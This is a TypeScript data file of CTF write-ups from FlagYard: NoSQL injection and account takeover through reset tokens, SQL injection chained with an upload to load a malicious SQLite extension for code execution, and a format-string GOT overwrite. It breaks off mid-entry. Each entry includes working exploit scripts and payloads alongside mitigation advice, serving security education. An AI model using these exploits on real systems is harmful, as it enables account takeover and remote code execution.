import type { WriteUp } from '../types';

// FlagYard — 6 writeups
export const flagyardWriteups: WriteUp[] = [
  {
    "id": "9",
    "title": "Pooking",
    "category": "Web",
    "difficulty": "Medium",
    "points": 0,
    "date": "2025-02-24",
    "author": "CTF Team",
    "ctfName": "FlagYard",
    "description": "Premium car rental platform with critical NoSQL injection vulnerabilities. Exploit blind NoSQL injections and token exhaustion to achieve account takeover of admin user and extract the flag.",
    "problemDescription": "A Node.js/MongoDB-based web application simulating a luxury car rental service. The backend implements custom authentication endpoints with insufficient input validation. Goal: gain unauthorized access to the admin account and retrieve the hidden flag embedded in the API response.",
    "tools": [
      "Python 3",
      "cURL",
      "Burp Suite",
      "NoSQL Injection Techniques",
      "MongoDB Query Manipulation"
    ],
    "analysis": "Security analysis reveals four critical vulnerabilities chained together in the API implementation:\n\n**Vulnerability 1: Blind NoSQL Injection on /api/forgot-password**\n\nThe endpoint accepts an email parameter that is directly interpolated into MongoDB queries without sanitization. By sending operator objects with regex patterns in the JSON payload, an attacker can perform regex-based queries. Each request returns either 200 OK (match found) or 404 Not Found (no match), creating a response-based oracle allowing character-by-character enumeration of usernames.\n\n**Vulnerability 2: Insufficient Token Validation on /api/reset-password**\n\nThe password reset endpoint accepts a token field in the request body, which is directly used in a MongoDB filter condition without verification. An attacker can send wildcard regex patterns to match ANY token in the database, not just their own.\n\n**Vulnerability 3: Sequential Document Processing Flaw**\n\nMongoDB's findOne() method returns the first matching document in insertion order. When multiple tokens match the wildcard pattern, only the first document is updated. By repeatedly sending requests with the same wildcard token filter, an attacker exhausts tokens until reaching the target admin account.\n\n**Vulnerability 4: Sensitive Data Leakage in API Response**\n\nThe web UI does not display sensitive admin fields, but the backend leaks them directly in the JSON response from /api/login. The flag is embedded in the user object returned after successful authentication, discoverable only through raw HTTP response inspection.",
    "solution": [
      {
        "title": "Step 1: Reconnaissance & Vulnerability Mapping",
        "content": "Analyze the web application to identify backend technology (MongoDB via ObjectID format 699c9327...) and API endpoints. Test basic NoSQL operators ($ne, $regex) against different endpoints to determine which is injectable."
      },
      {
        "title": "Step 2: Email Enumeration via Blind NoSQL Injection",
        "content": "Use the /api/forgot-password endpoint to enumerate admin email character-by-character. Send requests with {\"email\": {\"$regex\": \"^[charset]\"}} payloads. A 200 response indicates the character is present; 404 indicates it's not. Iterate through all possible characters in optimized order (digits first, then letters) to reconstruct the full email address.",
        "code": "import requests\nimport string\n\nBASE_URL = \"http://target:port/api/forgot-password\"\n\ndef check_email_prefix(prefix):\n    payload = {\"email\": {\"$regex\": f\"^{prefix}\"}}\n    response = requests.post(BASE_URL, json=payload)\n    return response.status_code == 200\n\nemail = \"\"\ncharset = string.digits + string.ascii_lowercase + \".-@\"\n\nfor pos in range(50):  # Max email length\n    for char in charset:\n        test_prefix = email + char\n        if check_email_prefix(test_prefix):\n            email = test_prefix\n            print(f\"[+] Found: {email}\")\n            break\n    else:\n        print(f\"[*] Email completed: {email}\")\n        break"
      },
      {
        "title": "Step 3: Trigger Reset Token Generation",
        "content": "Once the admin email is identified (e.g., 4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com), trigger the forgot-password mechanism by requesting a password reset token. This causes the backend to generate and store a reset token in the admin's document."
      },
      {
        "title": "Step 4: Token Exhaustion & Password Reset",
        "content": "Exploit the /api/reset-password endpoint with wildcard token matching. Send multiple requests with {\"token\": {\"$regex\": \"^.*\"}, \"newPassword\": \"HackedPassword123!\"} payload. Each request resets the password of the first user with a matching token. This sequentially burns through dummy account tokens until the admin account is reached, whose password is then forcibly changed to a value under attacker control.",
        "code": "import requests\nimport time\n\nBASE_URL = \"http://target:port/api/reset-password\"\nADMIN_EMAIL = \"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\"\nNEW_PASSWORD = \"HackedPassword123!\"\n\n# Token exhaustion loop\nfor attempt in range(1, 100):\n    payload = {\n        \"token\": {\"$regex\": \"^.*\"},\n        \"newPassword\": NEW_PASSWORD\n    }\n    \n    response = requests.post(BASE_URL, json=payload)\n    print(f\"[*] Attempt {attempt}: {response.status_code}\")\n    \n    if \"success\" in response.json():\n        print(f\"[+] Password reset successful!\")\n        break\n    \n    time.sleep(0.5)  # Small delay to avoid rate limiting"
      },
      {
        "title": "Step 5: Admin Account Takeover & Login",
        "content": "With the admin password compromised, authenticate to /api/login using the known email and the new password. The backend will return a JSON response containing the admin user object with sensitive data including the hidden flag."
      },
      {
        "title": "Step 6: Flag Extraction",
        "content": "Examine the raw JSON response from the login endpoint. The flag is embedded in the user object returned by the server, not visible in the web UI. Extract the flag field from the API response.",
        "code": "curl -s -X POST http://target:port/api/login \\\n  -H \"Content-Type: application/json\" \\\n  -d '{\n    \"email\": \"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\",\n    \"password\": \"HackedPassword123!\"\n  }' | jq '.user.flag'\n\n# Output: FlagY{9f4e47684e72251c97a092123b6176c1}"
      }
    ],
    "terminalOutputs": [
      {
        "command": "python3 solve.py",
        "output": "nata@rblx-labs ~/ctf/flagyard/web/14\n % python3 solve.py\n[*] Starting email extraction with digit priority...\nAttempt     5: ✓ '4'\nAttempt    19: ✓ '4d'\nAttempt    42: ✓ '4dm'\nAttempt    44: ✓ '4dm1'\nAttempt    68: ✓ '4dm1n'\nAttempt    70: ✓ '4dm1n1'\nAttempt    76: ✓ '4dm1n15'\nAttempt   106: ✓ '4dm1n15t'\nAttempt   134: ✓ '4dm1n15tr'\nAttempt   139: ✓ '4dm1n15tr4'\nAttempt   169: ✓ '4dm1n15tr4t'\nAttempt   170: ✓ '4dm1n15tr4t0'\nAttempt   198: ✓ '4dm1n15tr4t0r'\nAttempt   235: ✓ '4dm1n15tr4t0r@'\nAttempt   261: ✓ '4dm1n15tr4t0r@p'\nAttempt   262: ✓ '4dm1n15tr4t0r@p0'\nAttempt   263: ✓ '4dm1n15tr4t0r@p00'\nAttempt   284: ✓ '4dm1n15tr4t0r@p00k'\nAttempt   286: ✓ '4dm1n15tr4t0r@p00k1'\nAttempt   310: ✓ '4dm1n15tr4t0r@p00k1n'\nAttempt   327: ✓ '4dm1n15tr4t0r@p00k1ng'\nAttempt   367: ✓ '4dm1n15tr4t0r@p00k1ng.'\nAttempt   383: ✓ '4dm1n15tr4t0r@p00k1ng.f'\nAttempt   405: ✓ '4dm1n15tr4t0r@p00k1ng.fl'\nAttempt   410: ✓ '4dm1n15tr4t0r@p00k1ng.fl4'\nAttempt   427: ✓ '4dm1n15tr4t0r@p00k1ng.fl4g'\nAttempt   462: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy'\nAttempt   467: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4'\nAttempt   495: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4r'\nAttempt   509: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4rd'\nAttempt   549: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4rd.'\nAttempt   562: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4rd.c'\nAttempt   587: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4rd.co'\nAttempt   610: ✓ '4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com'\n✓ VERIFIED: 4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\nAttempt    852: trying '4dmy'^C\n\nInterrupted by user.\n\nCurrent collected emails (1 total):\n- 4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com"
      },
      {
        "command": "curl -s -X POST http://target/api/login -H 'Content-Type: application/json' -d '{\"email\": \"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\", \"password\": \"HackedPassword123!\"}'",
        "output": "{\n  \"success\": true,\n  \"message\": \"Login successful\",\n  \"user\": {\n    \"_id\": \"699c9327e39607aefcd8dbe8\",\n    \"email\": \"4dm1n15tr4t0r@p00k1ng.fl4gy4rd.com\",\n    \"password\": \"$2b$10$ggX4rt5vlqXhH5BpuZVOoOlK5Ct16WvDo5q5jTqZuNIW3b5x/QZb2\",\n    \"fullName\": \"Senior Administrator\",\n    \"phone\": \"+966501234570\",\n    \"role\": \"senior_admin\",\n    \"isActive\": true,\n    \"flag\": \"FlagY{9f4e47684e72251c97a092123b6176c1}\",\n    \"department\": \"IT Security\",\n    \"accessLevel\": \"Level 5\",\n    \"createdAt\": \"2023-01-01T00:00:00.000Z\",\n    \"lastLogin\": \"2026-02-23T19:05:01.319Z\"\n  }\n}"
      }
    ],
    "flag": "FlagY{9f4e47684e72251c97a092123b6176c1}",
    "lessonsLearned": "**Input Validation** - Never trust user input in database queries. Always use parameterized queries and proper input validation. NoSQL operators like $regex must be explicitly blocked in user-controlled parameters.\n\n**Token Management** - Password reset mechanisms are critical security components. Implement proper token validation (time-limited, single-use, cryptographically random) to prevent unauthorized access.\n\n**Query Security** - Query results should not rely on insertion order for security decisions. Always use explicit accountability mechanisms and verify users can only access their own data.\n\n**Data Exposure** - Sensitive data should never be exposed in API responses, even to authenticated users without explicit authorization. Implement proper field filtering based on user role.\n\n**Rate Limiting** - Implement rate limiting on authentication and password reset endpoints to prevent token exhaustion attacks and brute-force attempts.\n\n**Defense in Depth** - Combine input validation, proper query construction, and response sanitization to prevent information disclosure. Single-layer defenses are insufficient.\n\n**Optimization** - When exploiting APIs with many requests, implement parallel requests and smart enumeration strategies to accelerate the exploitation timeline."
  },
  {
    "id": "11",
    "title": "Subscriber",
    "category": "Web",
    "difficulty": "Hard",
    "points": 0,
    "date": "2025-02-24",
    "author": "nata",
    "ctfName": "FlagYard",
    "description": "SQLite extension loading RCE vulnerability. Exploit SQL Injection combined with unrestricted file uploads and SQLite load_extension() to achieve remote code execution.",
    "problemDescription": "A Flask application integrated with SQLite database configured with enable_load_extension(True). The /subscribe endpoint is vulnerable to SQL Injection through the updates_freq parameter. The /feedback endpoint allows file uploads with weak validation. The challenge is to combine both vulnerabilities to achieve RCE and read the flag from the system.",
    "tools": [
      "Python",
      "GCC",
      "SQLite",
      "SQL Injection",
      "Requests"
    ],
    "analysis": "Vulnerability analysis reveals three critical components enabling RCE:\n\n1. **SQL Injection in /subscribe**: The updates_freq parameter uses f-string interpolation without sanitization, allowing arbitrary SQL command injection.\n\n2. **Unrestricted File Upload**: The filter_filename function only checks file extension at the end of the filename with no magic bytes validation. A .so (shared object) file can be uploaded with name shell.jpg and stored in ./uploads/ directory.\n\n3. **SQLite load_extension()**: Database configuration with enable_load_extension(True) allows loading custom shared libraries. When load_extension('path/to/shell.so') is called, C code in the library executes with Flask process privilege.\n\n**Vulnerability Chain**: C extension payload runs automatically during loading (initialization phase). Since Flask is stateless, we leverage this to execute system commands (system()) redirecting output to an accessible file.",
    "solution": [
      {
        "title": "Executive Summary",
        "content": "Subscriber is an advanced web challenge simulating security failures in SQLite database integration with Flask. The vulnerability originates from simple SQL Injection which escalates to Remote Code Execution (RCE) through SQLite extension loading feature. Attackers exploit file validation gaps to upload malicious C libraries (shared objects)."
      },
      {
        "title": "Reconnaissance",
        "content": "The application has several functional endpoints:\n\n- `/`: Home page\n\n- `/subscribe`: Email subscription form using the `updates_freq` parameter\n- `/feedback`: Feedback submission form allowing file uploads\n\n**Database Identification**\n\nThrough error-based and boolean-based probing, the application uses SQLite. The critical finding is the database configuration explicitly allowing extension loading.\n\nDatabase configuration allows extension loading:\n\n```\n================ VULNERABLE CONFIG ================\nconn.enable_load_extension(True)\n================================================\n```\n\n**SQL Injection (Blind Boolean)**\n\nThe `updates_freq` parameter on `/subscribe` endpoint is vulnerable to SQL Injection due to f-string interpolation without sanitization:\n\n```\n================ VULNERABLE QUERY ================\ncursor.execute(f\"SELECT freq FROM updates_freq WHERE option = '{update_option}'\")\n================================================\n```\n\nBasic payload: `' OR 1=1 -- -`"
      },
      {
        "title": "Vulnerability Analysis - Unrestricted File Upload",
        "content": "**Vulnerability #1: Unrestricted File Upload (Extension Bypass)**\n\nThe filter_filename function only checks file extension at the filename end without validating actual content (magic bytes). An attacker can upload a .so (C library) file named shell.jpg, and the application stores it in the ./uploads/ directory."
      },
      {
        "title": "Vulnerability Analysis - SQLite Extension Loading RCE",
        "content": "**Vulnerability #2: SQLite Extension Loading RCE**\n\nThe load_extension() function in SQLite allows loading custom shared libraries. If an attacker can direct this function to an uploaded .so file, the C code inside the library executes with the same privileges as the web application."
      },
      {
        "title": "Exploitation - Malicious C Extension",
        "content": "**Step 1: Creating Malicious SQLite Extension**\n\nCreate a SQLite extension that executes system commands immediately when the library is loaded (initialization phase). This is crucial because Flask is stateless—database connections close after each request.",
        "code": "#include <sqlite3ext.h>\n#include <stdlib.h>\n\nSQLITE_EXTENSION_INIT1\n\nint sqlite3_extension_init(sqlite3 *db, char **pzErrMsg,\n                          const sqlite3_api_routines *pApi) {\n    SQLITE_EXTENSION_INIT2(pApi);\n    \n    // Payload executes automatically when load_extension() is called\n    system(\"cat /app/flag.txt > ./uploads/out.txt\");\n    \n    return SQLITE_OK;\n}\n\n// Compile with: gcc -shared -fPIC -o shell.so shell.c -lsqlite3"
      },
      {
        "title": "Exploitation - Python Solver",
        "content": "**Step 2: Exploit Automation Script**\n\nThis script uploads the payload and triggers execution through SQL Injection in a single workflow.",
        "code": "import requests\nimport time\n\nbase_url = \"http://ukjmwexhynntzwdgyxvsda-0.playat.flagyard.com\"\n\n# 1. Upload malicious extension\nwith open('shell.so', 'rb') as f:\n    requests.post(f\"{base_url}/feedback\", \n                 data={'title': 'Exploit', 'description': 'RCE'}, \n                 files={'file': ('shell.jpg', f, 'application/octet-stream')})\n\n# 2. Trigger RCE via SQL Injection\npayload = \"0' AND load_extension('./uploads/shell.jpg') -- -\"\nrequests.post(f\"{base_url}/subscribe\", \n             data={'email': 'a@b.com', 'updates_freq': payload})\n\n# 3. Read command output\ntime.sleep(1)\nprint(requests.get(f\"{base_url}/uploads/out.txt\").text)"
      },
      {
        "title": "Terminal - Step 1: Directory Exploration",
        "content": "**Step 1: Explore Root Directory** (`ls -la /`)\n\nInitial command to map the system structure.",
        "code": "================ OUTPUT BASH ================\ntotal 76\ndrwxr-xr-x   1 nobody nogroup 4096 Sep 30  2024 .\ndrwxr-xr-x   1 nobody nogroup 4096 Sep 30  2024 ..\ndrwxr-xr-x   1   1000    1000 4096 Feb 23 20:34 app\nlrwxrwxrwx   1 nobody nogroup    7 Sep 26  2024 bin -> usr/bin\n...\ndrwxr-xr-x  12 nobody nogroup 4096 Sep 26  2024 usr\ndrwxr-xr-x  11 nobody nogroup 4096 Sep 26  2024 var\n=============================================="
      },
      {
        "title": "Terminal - Step 2: Locate Flag File",
        "content": "**Step 2: Search Application Directory** (`ls -R /app`)\n\nLocate the actual flag file.",
        "code": "================ OUTPUT BASH ================\n/app:\napp.py\nconfig.py\nflag.txt  <-- FLAG FOUND!\ninstance\nrun\nsite.db\nstatic\ntemplates\nuploads\n=============================================="
      },
      {
        "title": "Terminal - Step 3: Extract Flag",
        "content": "**Step 3: Read Flag File** (`cat /app/flag.txt`)\n\nExtract the flag content.",
        "code": "nata@rblx-labs ~/ctf/flagyard/web/13 % python3 solve.py\n[+] Phase 1: Uploading malicious extension...\n[+] Phase 2: Loading extension & Triggering Execution...\n[+] Phase 3: Retrieving output from /uploads/out.txt...\n\n================ OUTPUT BASH ================\nFlagY{d65441712f1d145acbad77b9d78c87be}\n=============================================="
      },
      {
        "title": "Conclusion & Mitigation",
        "content": "The attack succeeds due to a combination of:\n\n**1. Insecure SQL Usage**\n\nNever use string interpolation in SQL queries. Always use parameterized queries with placeholders:\n\n```\n================ SECURE QUERY ================\ncursor.execute(\"SELECT freq FROM updates_freq WHERE option = ?\", (update_option,))\n================================================\n```\n\n**2. Database Misconfiguration**\n\nDo not enable load_extension in production. Keep extension loading disabled and restrict only to trusted administrators in controlled environments:\n\n```\n================ SECURE CONFIG ================\nconn.enable_load_extension(False)  # Default behavior\n================================================\n```\n\n**3. Weak File Validation**\n\nDo not rely solely on filename extensions. Implement multiple validation layers:\n- Validate magic bytes (file signatures)\n- Use whitelist MIME types\n- Disable script execution in upload directories (/uploads/.htaccess)\n- Rename uploaded files with random strings",
        "code": "# Secure file upload validation\nimport mimetypes\nimport os\nfrom pathlib import Path\n\nALLOWED_EXTENSIONS = {'jpg', 'jpeg', 'png', 'gif'}\nALLOWED_MIMES = {'image/jpeg', 'image/png', 'image/gif'}\n\ndef validate_upload(file):\n    # 1. Check extension\n    _, ext = os.path.splitext(file.filename)\n    if ext.lower()[1:] not in ALLOWED_EXTENSIONS:\n        raise ValueError(\"Invalid file extension\")\n    \n    # 2. Check MIME type\n    mime, _ = mimetypes.guess_type(file.filename)\n    if mime not in ALLOWED_MIMES:\n        raise ValueError(\"Invalid MIME type\")\n    \n    # 3. Check magic bytes\n    import magic\n    file_type = magic.from_buffer(file.read(1024), mime=True)\n    file.seek(0)  # Reset file pointer\n    if file_type not in ALLOWED_MIMES:\n        raise ValueError(\"Magic bytes do not match expected format\")\n    \n    return True"
      }
    ],
    "terminalOutputs": [
      {
        "command": "ls -la /",
        "output": "total 76\ndrwxr-xr-x   1 nobody nogroup 4096 Sep 30  2024 .\ndrwxr-xr-x   1 nobody nogroup 4096 Sep 30  2024 ..\ndrwxr-xr-x   1   1000    1000 4096 Feb 23 20:34 app\nlrwxrwxrwx   1 nobody nogroup    7 Sep 26  2024 bin -> usr/bin\ndrwxr-xr-x   2 nobody nogroup 4096 Sep 26  2024 boot\ndrwxr-xr-x   5 nobody nogroup 4096 Feb 23 19:42 dev\ndrwxr-xr-x   1 nobody nogroup   66 Feb 23 19:42 etc\ndrwxr-xr-x   1 nobody nogroup   19 Dec 26  2018 home\nlrwxrwxrwx   1 nobody nogroup    7 Sep 26  2024 lib -> usr/lib\nlrwxrwxrwx   1 nobody nogroup    9 Sep 26  2024 lib64 -> usr/lib64\ndrwxr-xr-x   2 nobody nogroup    6 Dec 29  2018 media\ndrwxr-xr-x   2 nobody nogroup    6 Dec 29  2018 mnt\ndrwxr-xr-x   2 nobody nogroup    6 Dec 29  2018 opt\ndr-xr-xr-x 117 root   root       0 Dec 26  2018 proc\ndr-xr-x---   2 root   root     160 Feb 23 19:42 root\ndrwxr-xr-x   1 root   root      28 Dec 29  2018 run\ndrwxr-xr-x   1 root   root      32 Dec 29  2018 sbin\ndrwxr-xr-x   2 root   root       6 Dec 29  2018 srv\ndr-xr-xr-x  13 root   root       0 Dec 26  2018 sys\ndrwxrwxrwt   1 root   root      36 Feb 23 19:48 tmp\ndrwxr-xr-x   1 root   root      19 Dec 26  2018 usr\ndrwxr-xr-x   1 root   root      17 Dec 29  2018 var"
      },
      {
        "command": "ls -R /app",
        "output": "/app:\napp.py\nconfig.py\nflag.txt\ninstance\nrun\nsite.db\nstatic\ntemplates\nuploads"
      },
      {
        "command": "python3 solve.py",
        "output": "[+] Phase 1: Uploading malicious extension...\n[+] Phase 2: Loading extension & Triggering Execution...\n[+] Phase 3: Retrieving output from /uploads/out.txt...\n\nFlagY{d65441712f1d145acbad77b9d78c87be}"
      }
    ],
    "flag": "FlagY{d65441712f1d145acbad77b9d78c87be}",
    "lessonsLearned": "**SQL Injection Prevention** - Never use string interpolation in SQL queries. Always use prepared statements with parameter binding to prevent SQL Injection attacks. Treated untrusted input as data, not code.\n\n**Database Extension Security** - Database extension features like load_extension() must be disabled in production environments. Restrict extension loading only to trusted administrators in controlled environments with proper auditing.\n\n**File Upload Validation** - File upload validation must not depend on a single defense layer. Implement multiple validation layers: extension whitelist, magic bytes verification, MIME type checking, and disable script execution in upload directories with proper server configuration.\n\n**Principle of Least Privilege** - Enable only the functionality required and disable everything unnecessary. SQLite enable_load_extension should be disabled by default in production deployments. Review all enabled features regularly.\n\n**Stateless Application Design** - Even though Flask is stateless, side effects from library loading can persist through the file system. Audit all initialization code in loaded extensions for unintended consequences and security implications.\n\n**Defense in Depth** - Multiple individually minor vulnerabilities can combine to create critical RCE. Secure development requires comprehensive security testing across all components and threat modeling of vulnerability chains."
  },
  {
    "id": "13",
    "title": "GOT me",
    "category": "Pwn",
    "difficulty": "Easy",
    "points": 0,
    "date": "2026-02-25",
    "author": "nata",
    "ctfName": "FlagYard",
    "description": "Binary exploitation via Format String vulnerability to achieve arbitrary write on Global Offset Table (GOT). Exploit circumvents modern Intel CET (Control-flow Enforcement Technology) protections by carefully targeting GOT entries while respecting indirect branch validation.",
    "problemDescription": "A 64-bit ELF binary with Partial RELRO and disabled stack canary. The binary implements a custom function containing a Format String vulnerability in a printf() call without format specifier validation. Goal: Exploit Format String to overwrite the GOT entry of puts() with the address of win() function, bypassing Intel CET indirect branch tracking (IBT) by respecting endbr64 instruction requirements.",
    "tools": [
      "pwntools",
      "radare2",
      "checksec",
      "objdump",
      "Format String exploitation",
      "Intel CET (SHSTK/IBT)"
    ],
    "analysis": "Security analysis reveals a combination of modern protections and exploitable weaknesses:\n\n**Binary Protections:**\n- Partial RELRO: GOT is writable, enabling arbitrary write via pointer manipulation\n- No Stack Canary: Stack overflow protection absent\n- NX Enabled: Code execution requires ROP or code injection\n- SHSTK & IBT (Intel CET): Indirect branches must land on endbr64 instructions; bypassing requires landing exactly at valid entry points\n- No PIE: Function addresses are static, simplifying target location\n\n**Vulnerability Analysis:**\n1. **Format String**: printf() called directly on user input without format specifier\n2. **Input Size**: fgets(buffer, 128) allows up to 127 bytes payload\n3. **Offset Discovery**: User input reaches printf at offset 6 in argument stack\n\n**Exploitation Challenge**: Must perform 3 separate 2-byte writes (using %hn) to completely overwrite GOT entry:\n- GOT+0: 0x11b6 (lower bytes of win_addr)\n- GOT+2: 0x0040 (middle bytes of win_addr)\n- GOT+4: 0x0000 (upper bytes to clear libc address)\n\n**Intel CET Bypass**: By landing exactly at 0x4011b6 (start of win function), the endbr64 instruction is respected, bypassing IBT validation.",
    "solution": [
      {
        "title": "Phase 1: Reconnaissance & Protection Analysis",
        "content": "Run checksec to identify security mitigations. The key findings:\n\n- **Partial RELRO** ← GOT is writable (THE VULNERABILITY!)\n- **No Stack Canary** ← Stack layout is predictable\n- **No PIE** ← Static addresses throughout\n- **Intel CET (IBT/SHSTK)** ← CPU-level protection on indirect branches\n\nPartial RELRO is our golden ticket - it means GOT can be hijacked. The absence of PIE makes finding addresses trivial. Intel CET requires landing at endbr64 instruction, but that's exactly where win() starts."
      },
      {
        "title": "Phase 2: Static Analysis via Reverse Engineering",
        "content": "Reverse engineer with radare2/objdump to find:\n\n**TARGET: win() @ 0x4011b6**\n- Starts with endbr64 (Intel CET safe)\n- Calls system(\"/bin/cat flag\")\n- Prize: FLAG output\n\n**VULNERABILITY: get_secret()**\n- fgets(buffer, 128) reads user input\n- mov rdi, buffer (puts input in RDI)\n- call printf(NO FORMAT SPEC!) ← THE BUG!\n- call puts via GOT\n\n**TARGET: GOT[puts] @ 0x404018**\n- Currently points to libc's puts\n- We'll redirect to win() @ 0x4011b6\n- Writable because Partial RELRO!"
      },
      {
        "title": "Phase 3: Format String Offset Discovery",
        "content": "Test with patterns to find where user input becomes accessible to printf. Input AAAAAAAA (0x4141414141414141 in hex) and test with format string specifiers to identify the stack offset. The result shows %6$p returns our input in hex, confirming user input is at offset 6 on the printf stack.\n\nOnce we know the offset is 6, we can plan our payload: by padding with dummy bytes and embedding pointers, those pointers will occupy stack positions 11, 12, and 13. This allows us to use %11$hn, %12$hn, %13$hn to write arbitrary 2-byte values to the addresses stored in those positions (the GOT entries we target).",
        "code": "Offset discovery method:\n\nPayload: AAAAAAAA\nTest: %1$p, %2$p, %3$p, %4$p, %5$p, %6$p\n\nResult: %6$p returns 0x4141414141414141\n→ User input at OFFSET 6!\n\nStack Layout:\nOffset 0-5:   Function pointers, saved values\nOffset 6:     [USER INPUT STRING START]\nOffset 11:    [p64(GOT+2)] ← %11$hn writes here\nOffset 12:    [p64(GOT+0)] ← %12$hn writes here\nOffset 13:    [p64(GOT+4)] ← %13$hn writes here"
      },
      {
        "title": "Phase 4: GOT Overwrite Strategy",
        "content": "The target address 0x4011b6 (win function) must be written into GOT[puts] at 0x404018. Since we can only write 2-byte values with %hn, break the address into three 2-byte chunks and write each separately using the three pointers at offsets 11, 12, 13.\n\nThe key is calculating the byte counts for printf to output. We write from smallest to largest value—this minimizes the total padding needed in the format string. Each %hn operation writes the number of bytes printf has already output (modulo 65536).\n\nThe resulting format string is compact at just 41 bytes, well under the 128-byte limit. The three pointer addresses are appended after padding to make them accessible via the stack offsets we discovered.",
        "code": "Address breakdown:\n0x4011b6 = [0x11b6] [0x0040] [0x0000]\n          (lower) (middle)  (upper)\n\nWrite sequence (smallest to largest):  \n1. %11$hn writes 0x0040 (byte count: 64) → GOT+2\n2. %12$hn writes 0x11b6 (byte count: 4534) → GOT+0\n3. %13$hn writes 0x0000 (byte count: 65536 wraps to 0) → GOT+4\n\nFormat string:  \n%64c              Output 64 bytes  \n%11$hn            Write 0x0040 @ offset 11  \n%4470c            Output 4470 MORE (total 4534)  \n%12$hn            Write 0x11b6 @ offset 12  \n%61002c           Output 61002 MORE (total 65536)  \n%13$hn            Write 0x0000 @ offset 13  \n\nTotal format string: 41 bytes✓"
      },
      {
        "title": "Phase 5: Payload Assembly",
        "content": "Assemble the complete 73-byte payload by combining the format string, padding, and GOT address pointers. The format string is 41 bytes and provides the directives for the three %hn writes. Pad with dummy bytes (we use 'A's) to reach exactly 40 bytes of total content before the pointers. This ensures proper alignment for the stack layout.\n\nAfter padding, append three 8-byte pointers: the first pointer for GOT+2, second for GOT+0, third for GOT+4. These pointers are embedded in the payload itself, and the padding ensures they occupy offsets 11, 12, and 13 when printf reads from the stack.",
        "code": "Final Payload Structure:\n\n[Section 1] Format String (41 bytes)\n%64c%11$hn%4470c%12$hn%61002c%13$hn\n\n[Section 2] Padding (pad to 40 byte alignment)\nAAAAAAAAAAAAAAAAAAAAAAAAA...\n\n[Section 3] Pointers (24 bytes total)\np64(0x40401a)  GOT+2, will be at offset 11\np64(0x404018)  GOT+0, will be at offset 12\np64(0x40401c)  GOT+4, will be at offset 13\n\n=== TOTAL: 73 bytes ==="
      },
      {
        "title": "Phase 6: Exploitation & Flag Extraction",
        "content": "Send the crafted 73-byte payload through the vulnerable printf input. The binary processes the format string, executing each %hn write operation in sequence. Each write operation dereferences the pointer at the specified offset on the stack and writes the calculated byte count to that address.\n\nAs execution progresses through the format string, the byte counter accumulates: first 64 bytes for the first write, then 4470 more to reach 4534 for the second write, then 61002 more to reach 65536 (which wraps to 0) for the third write. After printf completes and returns, the binary continues execution and calls puts via GOT. Since we've hijacked GOT[puts] to point to win() at 0x4011b6 (which starts with endbr64 for Intel CET compatibility), the program jumps into win(). The win function calls system(\"/bin/cat flag\") and outputs the flag.",
        "code": "Execution Flow:\n\n[1] printf() processes format string\n    %64c outputs 64 bytes\n    %11$hn dereferences [offset 11], WRITE 0x0040 to GOT+2\n\n[2] Continue format string processing\n    %4470c outputs 4470 MORE bytes (total now 4534)\n    %12$hn dereferences [offset 12], WRITE 0x11b6 to GOT+0\n\n[3] Final format directive\n    %61002c outputs 61002 MORE bytes (total 65536, wraps to 0)\n    %13$hn dereferences [offset 13], WRITE 0x0000 to GOT+4\n\n[4] After printf returns\n    Binary calls: puts() via GOT\n    GOT[0x404018] now contains 0x4011b6 (HIJACKED!)\n    CPU jumps to 0x4011b6 (endbr64 instruction present)\n\n[5] win() function executes\n    Calls system(\"/bin/cat flag\")\n    FLAG PRINTED! 🏁"
      },
      {
        "title": "Phase 7: Final Exploit Script",
        "content": "Put everything together in a single Python script using pwntools. The script connects to the remote server, crafts the format string payload with the correct byte count calculations, pads it to align the GOT pointers at the correct stack offsets, and sends the complete 73-byte payload to trigger the exploitation chain.",
        "code": "from pwn import *\n\n# Setup\np = remote('tcp.flagyard.com', 28339)\n\n# Target addresses\ntarget_got = 0x404018      # GOT[puts]\nwin_addr = 0x4011b6         # win() function\n\n# Break down address into 2-byte chunks\n# 0x4011b6 = [0x11b6] [0x0040] [0x0000]\n\nval1 = 64       # First write: 0x0040\nval2 = 4534     # Second write: 0x11b6\nval3 = 65536    # Third write: 0x0000 (wraps)\n\n# Build format string with cumulative byte counts\nfmt = f\"%{val1}c%11$hn\"\nfmt += f\"%{val2 - val1}c%12$hn\"\nfmt += f\"%{val3 - val2}c%13$hn\"\nfmt = fmt.encode()\n\n# Assemble payload\n# [Format String (41 bytes)] + [Padding to 40 bytes] + [3 pointers (24 bytes)]\npayload = fmt.ljust(40, b\"A\")           # Pad to 40 bytes\npayload += p64(target_got + 2)          # Pointer to GOT+2 @ offset 11\npayload += p64(target_got + 0)          # Pointer to GOT+0 @ offset 12\npayload += p64(target_got + 4)          # Pointer to GOT+4 @ offset 13\n\nlog.info(f\"Sending payload ({len(payload)} bytes)...\")\np.sendlineafter(b\"something: \", payload)\n\n# Wait for printf to finish and read output\np.recv(timeout=1)\nlog.success(\"Exploit success! Extracting flag...\\n\")\n\nprint(\"=\"*30)\nprint(p.clean(timeout=1).decode(errors='ignore').strip())\nprint(\"=\"*30)\n\np.interactive()"
      }
    ],
    "terminalOutputs": [
      {
        "command": "checksec ./got_me",
        "output": "[*] '/home/nata/ctf/flagyard/pwn/2/got_me'\n    Arch:       amd64-64-little\n    RELRO:      Partial RELRO\n    Stack:      No canary found\n    NX:         NX enabled\n    PIE:        No PIE (0x400000)\n    SHSTK:      Enabled\n    IBT:        Enabled"
      },
      {
        "command": "python3 -c 'print(\"AAAAAAAA %6$p\")'  | ./got_me",
        "output": "AAAAAAAA 0x4141414141414141"
      },
      {
        "command": "objdump -R got_me | grep puts",
        "output": "0000000000404018 R_X86_64_JUMP_SLOT  puts@GLIBC_2.2.5"
      },
      {
        "command": "python3 solve.py",
